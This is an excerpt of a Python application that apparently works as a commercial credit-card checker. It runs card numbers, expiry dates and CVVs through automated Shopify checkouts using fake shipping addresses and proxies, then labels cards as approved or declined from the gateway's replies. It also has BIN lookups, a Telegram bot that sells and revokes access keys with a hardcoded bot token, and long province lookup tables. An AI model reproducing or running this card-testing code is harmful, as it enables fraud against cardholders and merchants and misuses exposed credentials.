...
OWNER_BOT_TOKEN = '8326280463:AAFhT6F4m5gFaKReNtLVk5DqssVKyYLjrxg'
OWNER_CHAT_ID   = '7604528850'
...
def _bot_polling():
    ...
    while True:
        try:
            upd = _get('getUpdates', offset=offset, timeout=30,
            ...
            for u in upd.get('result', []):
                ...
                if text.startswith('/keygen'):
                    ...
                    lines = '\n'.join(new_keys)
                    _post('sendMessage', {'chat_id': chat_id,
                        'text': (f'✅ Generated {amount} key(s) for <b>{name}</b> — valid for {days} day(s):\n\n'
                                 f'<pre>{lines}</pre>\n\n'
                    ...
                    with _keys_lock:
                        active = {k: v for k, v in VALID_KEYS.items() if v['expiry'] > now}
                    if not active:
                        _post('sendMessage', {'chat_id': chat_id, 'text': 'No active keys.'})
                    else:
                        lines = '\n'.join(
                        ...
                        _post('sendMessage', {'chat_id': chat_id,
                            'text': f'<pre>{lines}</pre>', 'parse_mode': 'HTML'})

                elif text.startswith('/revokekey'):
                    parts = text.split()
                    if len(parts) < 2:
                        _post('sendMessage', {'chat_id': chat_id,
                            'text': 'Usage: /revokekey <KEY>'})
                        continue
                    k = parts[1].upper()
                    with _keys_lock:
                    ...
                    if removed:
                        ...
                        _post('sendMessage', {'chat_id': chat_id, 'text': f'Key {k} not found.'})
...
class ShopifyChecker:
    ...
    def generate_random_shipping_address(self) -> dict:
        ...
        pool = [
            {'firstName':'James','lastName':'Wilson','street':'781 N Clark Street','city':'Chicago','state':'IL','zip':'60610','phone':'3125550181','country':'US'},
            {'firstName':'Maria','lastName':'Garcia','street':'2201 Broadway','city':'New York','state':'NY','zip':'10024','phone':'2125550293','country':'US'},
            {'firstName':'Robert','lastName':'Martinez','street':'4520 Hollywood Blvd','city':'Los Angeles','state':'CA','zip':'90027','phone':'3235550472','country':'US'},
            {'firstName':'Linda','lastName':'Thompson','street':'315 E 8th Street','city':'Austin','state':'TX','zip':'78701','phone':'5125550138','country':'US'},
            {'firstName':'Michael','lastName':'Davis','street':'920 SW 6th Avenue','city':'Portland','state':'OR','zip':'97204','phone':'5035550294','country':'US'},
            {'firstName':'Patricia','lastName':'Brown','street':'1540 Market Street','city':'San Francisco','state':'CA','zip':'94102','phone':'4155550361','country':'US'},
            {'firstName':'William','lastName':'Johnson','street':'248 NW 5th Ave','city':'Miami','state':'FL','zip':'33128','phone':'3055550182','country':'US'},
            {'firstName':'Barbara','lastName':'Lee','street':'701 N 9th Street','city':'Phoenix','state':'AZ','zip':'85006','phone':'6025550247','country':'US'},
        ]
    ...
    async def fetch_all_products(self, domain: str) -> Tuple[bool, any]:
        ...
        return False, f"Cannot access products{status_hint} - site may block automated requests"

    async def check_card(self, domain: str, cc: str, mes: str, ano: str, cvv: str,
                         proxy: Optional[str] = None,
                         custom_address: Optional[dict] = None,
                         selected_variant: Optional[str] = None,
                         ship_name: Optional[str] = None) -> Tuple[bool, str, dict]:
        try:
            ...
            if selected_variant:
                ...
                product_data = {
                    ...
                    'handle': selected_variant.split('|')[1] if '|' in selected_variant else 'product',
                    'price': selected_variant.split('|')[2] if len(selected_variant.split('|')) > 2 else '1.00'
                }
            else:
            ...
            if custom_address and custom_address.get('street'):
                ...
                phone = re.sub(r'\D', '', custom_address.get('phone', '')) or '5555550000'
            ...
            queueToken = (
                self.extract_between(text, 'queueToken&quot;:&quot;', '&q') or
                self.extract_between(text, '"queueToken":"', '"') or
                self.extract_between(text, "queueToken':'", "'") or
                None
            )
            stableId = (
                self.extract_between(text, 'stableId&quot;:&quot;', '&q') or
                self.extract_between(text, '"stableId":"', '"') or
                self.extract_between(text, "stableId':'", "'") or
                None
            )
            subtotal = (
                self.extract_between(text, 'totalAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&q') or
                self.extract_between(text, '"totalAmount":{"value":{"amount":"', '"') or
                None
            )
            ...
            if 'data' not in shipping_resp:
                ...
                err_msg = gql_errors[0].get('message', 'Unknown GraphQL error') if gql_errors else 'No data in shipping response'
                return False, f"Shipping request failed: {err_msg}", {}

            negotiate = (shipping_resp.get('data') or {}).get('session', {}).get('negotiate', {})
            ...
            if (negotiate.get('result') or {}).get('__typename') == 'NegotiationResultFailed':
                return False, "Shipping negotiation failed", {}

            try:
                seller = shipping_resp['data']['session']['negotiate']['result']['sellerProposal']
                ...
                payment_methods = seller.get('payment', {}).get('availablePaymentLines', [])
                ...
                for pm_line in payment_methods:
                    ...
                    if pid:
                        ...
                        payment_name = (pm.get('extensibilityDisplayName')
                                        or pm.get('name', 'Credit Card'))
                        break
                if not paymentmethodidentifier:
                    paymentmethodidentifier = (
                        self.extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;') or
                        self.extract_between(text, '"paymentMethodIdentifier":"', '"')
                    )
            ...
            delivery_json['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
            ...
            delivery_json['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                'lines': [{'stableId': stableId}]
            }
            delivery_json['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
            }
            delivery_json['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
            delivery_json['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': b_street, 'address2': '', 'city': b_city,
                    'countryCode': b_country, 'postalCode': b_zip,
                    'firstName': b_first, 'lastName': b_last,
                    'zoneCode': b_state, 'phone': b_phone,
                }
            }
            delivery_json['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
            delivery_json['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
                    ...
                    'input': {
                        ...
                        'delivery': {
                            'deliveryLines': [{
                                ...
                                'deliveryMethodTypes': ['SHIPPING'],
                                'expectedTotalPrice': {
                                    'value': {'amount': shipping_amount, 'currencyCode': currency},
                                },
                            ...
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        ...
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': b_street, 'address2': '',
                                                'city': b_city, 'countryCode': b_country,
                                                'postalCode': b_zip, 'firstName': b_first,
                                                'lastName': b_last, 'zoneCode': b_state, 'phone': b_phone,
                                            },
                                        },
                                        'cardSource': None,
                                    },
                        ...
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {
                                'value': {'amount': tax_amount, 'currencyCode': currency},
                            },
                            'proposedTotalIncludedAmount': None,
                            'proposedMixedStateTotalAmount': None,
                            'proposedExemptions': [],
            ...
            def _parse_submit_result(rj, raw):
                ...
                try:
                    ...
                    if tname in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                ...
                if gql_errs:
                    return None, f"GQL Error | {gql_errs[0].get('message', str(gql_errs[0]))[:300]}"
            ...
            poll_gql_errors = resp_json.get('errors') if isinstance(resp_json, dict) else None
            if poll_gql_errors and not (isinstance(resp_json.get('data'), dict)
                                        and resp_json['data'].get('receipt')):
                err_msg = poll_gql_errors[0].get('message', str(poll_gql_errors[0]))[:300]
            ...
            if (any(k in code_lower for k in ['insufficient_funds', 'insufficient'])
                    or 'insufficient' in msg_lower
                    or 'insufficient_funds' in text_lower):
                return True, f"Approved - Insufficient Funds | {error_detail}", result_info
            elif (any(k in code_lower for k in ['invalid_cvc', 'incorrect_cvc', 'security_code'])
            ...
            elif (any(k in code_lower for k in ['zip', 'postal'])
            ...
            elif (any(k in code_lower for k in ['invalid_number', 'incorrect_number', 'invalid_card'])
            ...
            elif any(k in code_lower for k in ['do_not_honor', 'card_declined', 'generic_decline']):
...
async def bin_lookup_async(bin_number):
    ...
    apis = [
        ...
        (f'https://api.bincodes.com/bin/?format=json&api_key=free&bin={bin6}', _parse_bincodes),
    ]
                            ...
                            if parsed:
                                for k, v in parsed.items():
                                    if v and not result.get(k):
                                        result[k] = v
                                if all(result.get(k) for k in ['scheme', 'type', 'bank']):
                                    break
                except Exception:
                    continue
    except Exception:
...
def login():
    ...
    if request.method == 'POST':
        ...
        if nonce != session.get('login_nonce', ''):
            ...
            return render_template('login.html', error='Invalid request — please try again.', nonce=nonce_val)
        ...
        nonce_val = secrets.token_hex(16)
        session['login_nonce'] = nonce_val
        return render_template('login.html', error='Invalid or expired key.', nonce=nonce_val)
...
def check_proxy_route():
    ...
    if not proxy:
        return jsonify({'error': 'Invalid format — use ip:port or ip:port:user:pass'}), 400
        ...
        try:
            async with aiohttp.ClientSession(
                ...
                async with session.post(
                    ...
                    if not r2.get('ok'):
                        desc = r2.get('description', 'Could not send message — check chat ID')
    ...
    def _extract_provinces(raw_countries):
        ...
        for c in raw_countries:
            ...
            if iso and provs:
                provinces[iso] = [
                    {
                        'code': p.get('iso_code', p.get('code', p.get('abbreviation', ''))),
                ...
                async with session.get(
                    ...
                    if resp.status == 200:
                        ...
                        if len(countries_raw) >= 1:
                            result = [
                                {'code': c.get('iso_code', ''), 'name': c.get('name', '')}
                                for c in countries_raw if c.get('iso_code')
                            ]
            ...
            try:
                async with session.get(
                    ...
                    if resp.status == 200:
                        text = await resp.text()
                        m = re.search(
                            r'"available_countries"\s*:\s*(\[[\s\S]{10,5000}?\])',
                            text
                        )
                        if m:
                            try:
            ...
            try:
                ...
                if success:
                    ...
                    if 'login' not in checkout_url.lower():
                        ...
                        text = await resp.text()
                        m = re.search(
                            r'"available_countries"\s*:\s*(\[[\s\S]{10,10000}?\])',
                            text
                        )
                        if m:
                            try:
                        ...
                        for pattern in [
                            ...
                            if m2:
                                try:
                                    ...
                                    result = [
                                        {
                                            'code': c.get('iso_code', c.get('code', c.get('isoCode', ''))),
                                            'name': c.get('name', c.get('label', ''))
                                        }
                                        for c in raw
                                        if isinstance(c, dict) and (
                                            c.get('iso_code') or c.get('code') or c.get('isoCode')
                                        )
                                    ]
                                    provinces = _extract_provinces(raw)
                                    if len(result) > 1:
...
PROVINCES_DATA = {
    ...
    'MX': [
        ...
        {'code':'CS','name':'Chiapas'},{'code':'CH','name':'Chihuahua'},{'code':'CO','name':'Coahuila'},
        {'code':'CL','name':'Colima'},{'code':'DF','name':'Ciudad de Mexico'},{'code':'DG','name':'Durango'},
        {'code':'GT','name':'Guanajuato'},{'code':'GR','name':'Guerrero'},{'code':'HG','name':'Hidalgo'},
        {'code':'JA','name':'Jalisco'},{'code':'EM','name':'Estado de Mexico'},
        {'code':'MI','name':'Michoacan'},{'code':'MO','name':'Morelos'},{'code':'NA','name':'Nayarit'},
        {'code':'NL','name':'Nuevo Leon'},{'code':'OA','name':'Oaxaca'},{'code':'PU','name':'Puebla'},
        {'code':'QT','name':'Queretaro'},{'code':'QR','name':'Quintana Roo'},
        {'code':'SL','name':'San Luis Potosi'},{'code':'SI','name':'Sinaloa'},{'code':'SO','name':'Sonora'},
        {'code':'TB','name':'Tabasco'},{'code':'TM','name':'Tamaulipas'},{'code':'TL','name':'Tlaxcala'},
        {'code':'VE','name':'Veracruz'},{'code':'YU','name':'Yucatan'},{'code':'ZA','name':'Zacatecas'},
    ],
    'BR': [
    ...
    'IN': [
        ...
        {'code':'DD','name':'Dadra and Nagar Haveli and Daman and Diu'},{'code':'DL','name':'Delhi'},
    ...
    'DE': [
        {'code':'BB','name':'Brandenburg'},{'code':'BE','name':'Berlin'},{'code':'BW','name':'Baden-Wuerttemberg'},
        {'code':'BY','name':'Bavaria'},{'code':'HB','name':'Bremen'},{'code':'HE','name':'Hesse'},
    ...
    'IT': [
        ...
        {'code':'EN','name':'Enna'},{'code':'FC','name':'Forli-Cesena'},{'code':'FE','name':'Ferrara'},
        {'code':'FG','name':'Foggia'},{'code':'FI','name':'Florence'},{'code':'FM','name':'Fermo'},
        {'code':'FR','name':'Frosinone'},{'code':'GE','name':'Genoa'},{'code':'GO','name':'Gorizia'},
        ...
        {'code':'LU','name':'Lucca'},{'code':'MB','name':'Monza e Brianza'},{'code':'MC','name':'Macerata'},
        {'code':'ME','name':'Messina'},{'code':'MI','name':'Milan'},{'code':'MN','name':'Mantua'},
        {'code':'MO','name':'Modena'},{'code':'MS','name':'Massa-Carrara'},{'code':'MT','name':'Matera'},
        {'code':'NA','name':'Naples'},{'code':'NO','name':'Novara'},{'code':'NU','name':'Nuoro'},
        {'code':'OR','name':'Oristano'},{'code':'PA','name':'Palermo'},{'code':'PC','name':'Piacenza'},
        {'code':'PD','name':'Padua'},{'code':'PE','name':'Pescara'},{'code':'PG','name':'Perugia'},
        {'code':'PI','name':'Pisa'},{'code':'PN','name':'Pordenone'},{'code':'PO','name':'Prato'},
        {'code':'PT','name':'Pistoia'},{'code':'PU','name':'Pesaro e Urbino'},{'code':'PV','name':'Pavia'},
        {'code':'PZ','name':'Potenza'},{'code':'RA','name':'Ravenna'},{'code':'RC','name':'Reggio Calabria'},
        {'code':'RE','name':'Reggio Emilia'},{'code':'RG','name':'Ragusa'},{'code':'RI','name':'Rieti'},
        {'code':'RM','name':'Rome'},{'code':'RN','name':'Rimini'},{'code':'RO','name':'Rovigo'},
        {'code':'SA','name':'Salerno'},{'code':'SI','name':'Siena'},{'code':'SO','name':'Sondrio'},
        {'code':'SP','name':'La Spezia'},{'code':'SR','name':'Syracuse'},{'code':'SS','name':'Sassari'},
        {'code':'SU','name':'South Sardinia'},{'code':'SV','name':'Savona'},{'code':'TA','name':'Taranto'},
        {'code':'TE','name':'Teramo'},{'code':'TN','name':'Trento'},{'code':'TO','name':'Turin'},
        {'code':'TP','name':'Trapani'},{'code':'TR','name':'Terni'},{'code':'TS','name':'Trieste'},
        {'code':'TV','name':'Treviso'},{'code':'UD','name':'Udine'},{'code':'VA','name':'Varese'},
        {'code':'VB','name':'Verbano-Cusio-Ossola'},{'code':'VC','name':'Vercelli'},{'code':'VE','name':'Venice'},
    ...
    'ES': [
        ...
        {'code':'CB','name':'Cantabria'},{'code':'CE','name':'Ceuta'},{'code':'CL','name':'Castile and Leon'},
        {'code':'CM','name':'Castilla-La Mancha'},{'code':'CN','name':'Canary Islands'},
        {'code':'CT','name':'Catalonia'},{'code':'EX','name':'Extremadura'},{'code':'GA','name':'Galicia'},
        {'code':'IB','name':'Balearic Islands'},{'code':'LO','name':'La Rioja'},{'code':'MD','name':'Community of Madrid'},
        {'code':'ME','name':'Melilla'},{'code':'MU','name':'Region of Murcia'},
        {'code':'NC','name':'Chartered Community of Navarre'},{'code':'PV','name':'Basque Country'},
    ...
    'FR': [
        ...
        {'code':'GUA','name':'Guadeloupe'},{'code':'GUY','name':'French Guiana'},
        {'code':'HDF','name':'Hauts-de-France'},{'code':'IDF','name':'Ile-de-France'},
        {'code':'LRE','name':'Reunion'},{'code':'MAR','name':'Martinique'},
        {'code':'MAY','name':'Mayotte'},{'code':'NAQ','name':'Nouvelle-Aquitaine'},
        {'code':'NOR','name':'Normandy'},{'code':'OCC','name':'Occitanie'},
        {'code':'PDL','name':'Pays de la Loire'},{'code':'PAC','name':"Provence-Alpes-Cote d'Azur"},
    ],
    'JP': [
        {'code':'JP-01','name':'Hokkaido'},{'code':'JP-02','name':'Aomori'},{'code':'JP-03','name':'Iwate'},
        {'code':'JP-04','name':'Miyagi'},{'code':'JP-05','name':'Akita'},{'code':'JP-06','name':'Yamagata'},
        {'code':'JP-07','name':'Fukushima'},{'code':'JP-08','name':'Ibaraki'},{'code':'JP-09','name':'Tochigi'},
        {'code':'JP-10','name':'Gunma'},{'code':'JP-11','name':'Saitama'},{'code':'JP-12','name':'Chiba'},
        {'code':'JP-13','name':'Tokyo'},{'code':'JP-14','name':'Kanagawa'},{'code':'JP-15','name':'Niigata'},
        {'code':'JP-16','name':'Toyama'},{'code':'JP-17','name':'Ishikawa'},{'code':'JP-18','name':'Fukui'},
        {'code':'JP-19','name':'Yamanashi'},{'code':'JP-20','name':'Nagano'},{'code':'JP-21','name':'Gifu'},
        {'code':'JP-22','name':'Shizuoka'},{'code':'JP-23','name':'Aichi'},{'code':'JP-24','name':'Mie'},
        {'code':'JP-25','name':'Shiga'},{'code':'JP-26','name':'Kyoto'},{'code':'JP-27','name':'Osaka'},
        {'code':'JP-28','name':'Hyogo'},{'code':'JP-29','name':'Nara'},{'code':'JP-30','name':'Wakayama'},
        {'code':'JP-31','name':'Tottori'},{'code':'JP-32','name':'Shimane'},{'code':'JP-33','name':'Okayama'},
        {'code':'JP-34','name':'Hiroshima'},{'code':'JP-35','name':'Yamaguchi'},{'code':'JP-36','name':'Tokushima'},
        {'code':'JP-37','name':'Kagawa'},{'code':'JP-38','name':'Ehime'},{'code':'JP-39','name':'Kochi'},
        {'code':'JP-40','name':'Fukuoka'},{'code':'JP-41','name':'Saga'},{'code':'JP-42','name':'Nagasaki'},
        {'code':'JP-43','name':'Kumamoto'},{'code':'JP-44','name':'Oita'},{'code':'JP-45','name':'Miyazaki'},
        {'code':'JP-46','name':'Kagoshima'},{'code':'JP-47','name':'Okinawa'},
    ],
    'ZA': [
    ...
    'NZ': [
        ...
        {'code':'MWT','name':'Manawatu-Wanganui'},{'code':'NSN','name':'Nelson'},
        {'code':'NTL','name':'Northland'},{'code':'OTA','name':'Otago'},{'code':'STL','name':'Southland'},
        {'code':'TAS','name':'Tasman'},{'code':'TKI','name':'Taranaki'},{'code':'WGN','name':'Wellington'},
    ...
    'PH': [
        ...
        {'code':'ALB','name':'Albay'},{'code':'ANT','name':'Antique'},{'code':'APA','name':'Apayao'},
        {'code':'AUR','name':'Aurora'},{'code':'BAS','name':'Basilan'},{'code':'BAN','name':'Bataan'},
        {'code':'BTN','name':'Batanes'},{'code':'BTG','name':'Batangas'},{'code':'BEN','name':'Benguet'},
        {'code':'BIL','name':'Biliran'},{'code':'BOH','name':'Bohol'},{'code':'BUK','name':'Bukidnon'},
        {'code':'BUL','name':'Bulacan'},{'code':'CAG','name':'Cagayan'},{'code':'CAN','name':'Camarines Norte'},
        {'code':'CAS','name':'Camarines Sur'},{'code':'CAM','name':'Camiguin'},
        {'code':'CAP','name':'Capiz'},{'code':'CAT','name':'Catanduanes'},{'code':'CAV','name':'Cavite'},
        {'code':'CEB','name':'Cebu'},{'code':'COM','name':'Compostela Valley'},
        {'code':'NCO','name':'Cotabato'},{'code':'DAV','name':'Davao del Norte'},
        {'code':'DAS','name':'Davao del Sur'},{'code':'DAO','name':'Davao Occidental'},
        {'code':'DAC','name':'Davao de Oro'},{'code':'DAO','name':'Davao Oriental'},
        {'code':'DIN','name':'Dinagat Islands'},{'code':'EAS','name':'Eastern Samar'},
        {'code':'GUI','name':'Guimaras'},{'code':'IFU','name':'Ifugao'},
        {'code':'ILN','name':'Ilocos Norte'},{'code':'ILS','name':'Ilocos Sur'},
        {'code':'ILI','name':'Iloilo'},{'code':'ISA','name':'Isabela'},{'code':'KAL','name':'Kalinga'},
        {'code':'LAN','name':'Lanao del Norte'},{'code':'LAS','name':'Lanao del Sur'},
        {'code':'LUN','name':'La Union'},{'code':'LAG','name':'Laguna'},
        {'code':'LEY','name':'Leyte'},{'code':'MAG','name':'Maguindanao'},
        {'code':'MAR','name':'Marinduque'},{'code':'MAS','name':'Masbate'},
        {'code':'MDC','name':'Mindoro Occidental'},{'code':'MDR','name':'Mindoro Oriental'},
        {'code':'MIS','name':'Misamis Occidental'},{'code':'MSR','name':'Misamis Oriental'},
        {'code':'MOU','name':'Mountain Province'},{'code':'NEC','name':'Negros Occidental'},
        {'code':'NER','name':'Negros Oriental'},{'code':'NSA','name':'Northern Samar'},
        {'code':'NUE','name':'Nueva Ecija'},{'code':'NUV','name':'Nueva Vizcaya'},
        {'code':'MDC','name':'Occidental Mindoro'},{'code':'PLW','name':'Palawan'},
        {'code':'PAM','name':'Pampanga'},{'code':'PAN','name':'Pangasinan'},
        {'code':'QUE','name':'Quezon'},{'code':'QUI','name':'Quirino'},
        {'code':'RIZ','name':'Rizal'},{'code':'ROM','name':'Romblon'},
        {'code':'WSA','name':'Samar'},{'code':'SAR','name':'Sarangani'},
        {'code':'SIQ','name':'Siquijor'},{'code':'SOR','name':'Sorsogon'},
        {'code':'SCO','name':'South Cotabato'},{'code':'SLE','name':'Southern Leyte'},
        {'code':'SUK','name':'Sultan Kudarat'},{'code':'SLU','name':'Sulu'},
        {'code':'SUN','name':'Surigao del Norte'},{'code':'SUR','name':'Surigao del Sur'},
        {'code':'TAR','name':'Tarlac'},{'code':'TAW','name':'Tawi-Tawi'},
        {'code':'ZMB','name':'Zambales'},{'code':'ZAN','name':'Zamboanga del Norte'},
        {'code':'ZAS','name':'Zamboanga del Sur'},{'code':'ZSI','name':'Zamboanga Sibugay'},
    ],
    'MY': [
        {'code':'01','name':'Johor'},{'code':'02','name':'Kedah'},{'code':'03','name':'Kelantan'},
        {'code':'04','name':'Melaka'},{'code':'05','name':'Negeri Sembilan'},
        {'code':'06','name':'Pahang'},{'code':'07','name':'Pulau Pinang'},
        {'code':'08','name':'Perak'},{'code':'09','name':'Perlis'},
        {'code':'10','name':'Selangor'},{'code':'11','name':'Terengganu'},
        {'code':'12','name':'Sabah'},{'code':'13','name':'Sarawak'},
        {'code':'14','name':'Kuala Lumpur'},{'code':'15','name':'Labuan'},
        {'code':'16','name':'Putrajaya'},
    ],
    'NG': [
        {'code':'AB','name':'Abia'},{'code':'FC','name':'Abuja'},{'code':'AD','name':'Adamawa'},
        {'code':'AK','name':'Akwa Ibom'},{'code':'AN','name':'Anambra'},{'code':'BA','name':'Bauchi'},
        {'code':'BY','name':'Bayelsa'},{'code':'BE','name':'Benue'},{'code':'BO','name':'Borno'},
        {'code':'CR','name':'Cross River'},{'code':'DE','name':'Delta'},{'code':'EB','name':'Ebonyi'},
        {'code':'ED','name':'Edo'},{'code':'EK','name':'Ekiti'},{'code':'EN','name':'Enugu'},
    ...
    'AR': [
        ...
        {'code':'X','name':'Cordoba'},{'code':'W','name':'Corrientes'},{'code':'E','name':'Entre Rios'},
        {'code':'P','name':'Formosa'},{'code':'Y','name':'Jujuy'},{'code':'L','name':'La Pampa'},
        {'code':'F','name':'La Rioja'},{'code':'M','name':'Mendoza'},{'code':'N','name':'Misiones'},
        {'code':'Q','name':'Neuquen'},{'code':'R','name':'Rio Negro'},{'code':'A','name':'Salta'},
    ...
    'CL': [
        {'code':'AI','name':'Aisen'},{'code':'AN','name':'Antofagasta'},{'code':'AP','name':'Arica y Parinacota'},
        {'code':'AT','name':'Atacama'},{'code':'BI','name':'Biobio'},{'code':'CO','name':'Coquimbo'},
        {'code':'AR','name':'La Araucania'},{'code':'LI','name':'Libertador General Bernardo O\'Higgins'},
        {'code':'LL','name':'Los Lagos'},{'code':'LR','name':'Los Rios'},{'code':'MA','name':'Magallanes'},
        {'code':'ML','name':'Maule'},{'code':'NB','name':'Nuble'},{'code':'RM','name':'Region Metropolitana'},
        {'code':'TA','name':'Tarapaca'},{'code':'VS','name':'Valparaiso'},
    ],
    'CO': [
        {'code':'AMA','name':'Amazonas'},{'code':'ANT','name':'Antioquia'},{'code':'ARA','name':'Arauca'},
        {'code':'ATL','name':'Atlantico'},{'code':'BOL','name':'Bolivar'},{'code':'BOY','name':'Boyaca'},
        {'code':'CAL','name':'Caldas'},{'code':'CAQ','name':'Caqueta'},{'code':'CAS','name':'Casanare'},
        {'code':'CAU','name':'Cauca'},{'code':'CES','name':'Cesar'},{'code':'CHO','name':'Choco'},
        {'code':'COR','name':'Cordoba'},{'code':'CUN','name':'Cundinamarca'},{'code':'DC','name':'Bogota D.C.'},
        {'code':'GUA','name':'Guainia'},{'code':'GUV','name':'Guaviare'},{'code':'HUI','name':'Huila'},
        {'code':'LAG','name':'La Guajira'},{'code':'MAG','name':'Magdalena'},{'code':'MET','name':'Meta'},
        {'code':'NAR','name':'Narino'},{'code':'NSA','name':'Norte de Santander'},
        {'code':'PUT','name':'Putumayo'},{'code':'QUI','name':'Quindio'},{'code':'RIS','name':'Risaralda'},
        {'code':'SAP','name':'San Andres y Providencia'},{'code':'SAN','name':'Santander'},
        {'code':'SUC','name':'Sucre'},{'code':'TOL','name':'Tolima'},
        {'code':'VAC','name':'Valle del Cauca'},{'code':'VAU','name':'Vaupes'},{'code':'VID','name':'Vichada'},
    ],
    'PE': [
        {'code':'AMA','name':'Amazonas'},{'code':'ANC','name':'Ancash'},{'code':'APU','name':'Apurimac'},
        ...
        {'code':'HUC','name':'Huanuco'},{'code':'ICA','name':'Ica'},{'code':'JUN','name':'Junin'},
        {'code':'LAL','name':'La Libertad'},{'code':'LAM','name':'Lambayeque'},
        {'code':'LIM','name':'Lima'},{'code':'LOR','name':'Loreto'},{'code':'MDD','name':'Madre de Dios'},
        {'code':'MOQ','name':'Moquegua'},{'code':'PAS','name':'Pasco'},{'code':'PIU','name':'Piura'},
        {'code':'PUN','name':'Puno'},{'code':'SAM','name':'San Martin'},{'code':'TAC','name':'Tacna'},
        {'code':'TUM','name':'Tumbes'},{'code':'UCA','name':'Ucayali'},
    ],
    'ID': [
        {'code':'AC','name':'Aceh'},{'code':'BA','name':'Bali'},{'code':'BB','name':'Bangka Belitung Islands'},
        {'code':'BT','name':'Banten'},{'code':'BE','name':'Bengkulu'},{'code':'GO','name':'Gorontalo'},
        {'code':'JK','name':'Jakarta'},{'code':'JA','name':'Jambi'},{'code':'JB','name':'West Java'},
        {'code':'JT','name':'Central Java'},{'code':'JI','name':'East Java'},
        {'code':'KB','name':'West Kalimantan'},{'code':'KS','name':'South Kalimantan'},
        {'code':'KT','name':'Central Kalimantan'},{'code':'KI','name':'East Kalimantan'},
        {'code':'KU','name':'North Kalimantan'},{'code':'KR','name':'Riau Islands'},
        {'code':'LA','name':'Lampung'},{'code':'MA','name':'Maluku'},
        {'code':'MU','name':'North Maluku'},{'code':'NB','name':'West Nusa Tenggara'},
        {'code':'NT','name':'East Nusa Tenggara'},{'code':'PA','name':'Papua'},
        {'code':'PB','name':'West Papua'},{'code':'RI','name':'Riau'},
        {'code':'SR','name':'West Sulawesi'},{'code':'SN','name':'South Sulawesi'},
        {'code':'ST','name':'Central Sulawesi'},{'code':'SG','name':'Southeast Sulawesi'},
        {'code':'SA','name':'North Sulawesi'},{'code':'SB','name':'West Sumatra'},
        {'code':'SS','name':'South Sumatra'},{'code':'SU','name':'North Sumatra'},
    ...
    'CN': [
        ...
        {'code':'NM','name':'Inner Mongolia'},{'code':'JS','name':'Jiangsu'},{'code':'JX','name':'Jiangxi'},
        {'code':'JL','name':'Jilin'},{'code':'LN','name':'Liaoning'},{'code':'MO','name':'Macau'},
        ...
        {'code':'SC','name':'Sichuan'},{'code':'TJ','name':'Tianjin'},{'code':'XJ','name':'Xinjiang'},
        {'code':'XZ','name':'Tibet'},{'code':'YN','name':'Yunnan'},{'code':'ZJ','name':'Zhejiang'},
    ],
    'KR': [
        {'code':'26','name':'Busan'},{'code':'43','name':'Chungcheongbuk-do'},
        {'code':'44','name':'Chungcheongnam-do'},{'code':'27','name':'Daegu'},
        {'code':'30','name':'Daejeon'},{'code':'42','name':'Gangwon-do'},
        {'code':'29','name':'Gwangju'},{'code':'41','name':'Gyeonggi-do'},
        {'code':'47','name':'Gyeongsangbuk-do'},{'code':'48','name':'Gyeongsangnam-do'},
        {'code':'28','name':'Incheon'},{'code':'49','name':'Jeju-do'},
        {'code':'45','name':'Jeollabuk-do'},{'code':'46','name':'Jeollanam-do'},
        {'code':'50','name':'Sejong'},{'code':'11','name':'Seoul'},{'code':'31','name':'Ulsan'},
    ],
    'TH': [
        ...
        {'code':'22','name':'Chanthaburi'},{'code':'23','name':'Trat'},
        {'code':'24','name':'Chachoengsao'},{'code':'25','name':'Prachin Buri'},
        {'code':'26','name':'Nakhon Nayok'},{'code':'27','name':'Sa Kaeo'},
        ...
        {'code':'38','name':'Bueng Kan'},{'code':'39','name':'Nong Bua Lam Phu'},
        ...
        {'code':'58','name':'Mae Hong Son'},{'code':'60','name':'Nakhon Sawan'},
        {'code':'61','name':'Uthai Thani'},{'code':'62','name':'Kamphaeng Phet'},
        {'code':'63','name':'Tak'},{'code':'64','name':'Sukhothai'},
        {'code':'65','name':'Phitsanulok'},{'code':'66','name':'Phichit'},
        {'code':'67','name':'Phetchabun'},{'code':'70','name':'Ratchaburi'},
        {'code':'71','name':'Kanchanaburi'},{'code':'72','name':'Suphan Buri'},
        {'code':'73','name':'Nakhon Pathom'},{'code':'74','name':'Samut Sakhon'},
        {'code':'75','name':'Samut Songkhram'},{'code':'76','name':'Phetchaburi'},
        {'code':'77','name':'Prachuap Khiri Khan'},{'code':'80','name':'Nakhon Si Thammarat'},
        {'code':'81','name':'Krabi'},{'code':'82','name':'Phangnga'},
        {'code':'83','name':'Phuket'},{'code':'84','name':'Surat Thani'},
        {'code':'85','name':'Ranong'},{'code':'86','name':'Chumphon'},
        {'code':'90','name':'Songkhla'},{'code':'91','name':'Satun'},
        {'code':'92','name':'Trang'},{'code':'93','name':'Phatthalung'},
        {'code':'94','name':'Pattani'},{'code':'95','name':'Yala'},
        {'code':'96','name':'Narathiwat'},
    ],
    'EG': [
        {'code':'ALX','name':'Alexandria'},{'code':'ASN','name':'Aswan'},{'code':'AST','name':'Asyut'},
        {'code':'BH','name':'Beheira'},{'code':'BNS','name':'Beni Suef'},{'code':'C','name':'Cairo'},
        {'code':'DK','name':'Dakahlia'},{'code':'DT','name':'Damietta'},{'code':'FYM','name':'Faiyum'},
        {'code':'GH','name':'Gharbia'},{'code':'GZ','name':'Giza'},{'code':'IS','name':'Ismailia'},
        {'code':'KFS','name':'Kafr el-Sheikh'},{'code':'LX','name':'Luxor'},{'code':'MT','name':'Matrouh'},
        {'code':'MN','name':'Minya'},{'code':'MNF','name':'Monufia'},{'code':'WAD','name':'New Valley'},
        {'code':'SHR','name':'North Sinai'},{'code':'PTS','name':'Port Said'},
        {'code':'KB','name':'Qalyubia'},{'code':'KN','name':'Qena'},{'code':'SHG','name':'Sohag'},
